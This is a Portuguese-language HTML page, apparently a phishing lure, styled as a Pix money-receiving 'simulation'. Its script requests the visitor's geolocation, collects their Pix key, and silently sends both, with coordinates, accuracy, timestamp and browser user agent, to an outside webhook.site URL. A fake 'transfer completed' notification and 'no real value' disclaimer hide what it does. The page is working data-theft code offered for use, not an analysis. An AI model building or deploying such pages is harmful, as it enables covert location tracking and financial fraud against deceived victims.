<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Simulação Pix</title>

<style>
/* ====== Base ====== */
body{
  margin:0;
  background:#f2f2f2;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  font-family:Arial, sans-serif;
}
.card{
  background:#fff;
  padding:35px;
  border-radius:18px;
  width:320px;
  text-align:center;
  box-shadow:0 10px 25px rgba(0,0,0,.08);
}
button{
  background:#820ad1;
  color:#fff;
  border:none;
  padding:15px;
  width:100%;
  font-size:18px;
  border-radius:12px;
  cursor:pointer;
}
input{
  width:100%;
  padding:12px;
  font-size:16px;
  margin:15px 0;
  border-radius:8px;
  border:1px solid #ccc;
}
small{ color:#777; font-size:12px; }
.alert{
  color:#b00020;
  font-size:13px;
  margin-top:10px;
}

/* ====== Notificação fake (animação) ====== */
.notificacao{
  position:fixed;
  top:-120px;
  left:50%;
  transform:translateX(-50%);
  background:#820ad1;
  color:#fff;
  padding:16px 22px;
  border-radius:14px;
  width:320px;
  box-shadow:0 8px 20px rgba(0,0,0,.25);
  transition:top .5s ease;
  z-index:9999;
}
.notificacao.mostrar{ top:20px; }
.notificacao strong{ display:block; font-size:14px; }
.notificacao span{ font-size:13px; opacity:.9; }
</style>
</head>

<body>

<!-- ====== Notificação animada ====== -->
<div id="notif" class="notificacao">
  <strong>Trunfo — Simulação</strong>
  <span>Simulação de transferência concluída</span>
</div>

<!-- ====== Tela 1 ====== -->
<div class="card" id="tela1">
  <button onclick="pedirPermissoes()">Receber Pix</button>
  <div id="erro1" class="alert"></div>
</div>

<!-- ====== Tela 2 ====== -->
<div class="card" id="tela2" style="display:none">
  <input id="chave" placeholder="Digite sua chave Pix">
  <button onclick="confirmar()">Receber Pix</button>
  <small>Simulação — nenhum valor real será transferido</small>
</div>

<!-- ====== Tela 3 ====== -->
<div class="card" id="tela3" style="display:none">
  <h3>✅ Simulação concluída</h3>
  <p>Obrigado por participar da demonstração.</p>
</div>

<script>
/* ====== Config ====== */
const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";

/* ====== Estado ====== */
let localOk = false;
let lastPos = null;

/* ====== Permissões no primeiro botão ====== */
function pedirPermissoes(){
  document.getElementById("erro1").innerText = "";

  if(!navigator.geolocation){
    document.getElementById("erro1").innerText =
      "Seu navegador não suporta localização.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos=>{
      localOk = true;
      lastPos = pos;
      // avançar
      document.getElementById("tela1").style.display="none";
      document.getElementById("tela2").style.display="block";
    },
    ()=>{
      document.getElementById("erro1").innerText =
        "Por favor, dê as permissões para que possamos continuar a simulação.";
    }
  );
}

/* ====== Confirmar ====== */
function confirmar(){
  if(!localOk || !lastPos){
    alert("Permissões necessárias para continuar.");
    return;
  }

  // envia dados pra tu
  fetch(WEBHOOK,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chave_pix: document.getElementById("chave").value,
      latitude: lastPos.coords.latitude,
      longitude: lastPos.coords.longitude,
      precisao: lastPos.coords.accuracy,
      data: new Date().toISOString(),
      navegador: navigator.userAgent
    })
  });

  // mostra animação
  mostrarNotif();

  // tela final
  document.getElementById("tela2").style.display="none";
  document.getElementById("tela3").style.display="block";
}

/* ====== Animação ====== */
function mostrarNotif(){
  const n = document.getElementById("notif");
  n.classList.add("mostrar");
  setTimeout(()=> n.classList.remove("mostrar"), 4000);
}
</script>

</body>
</html>
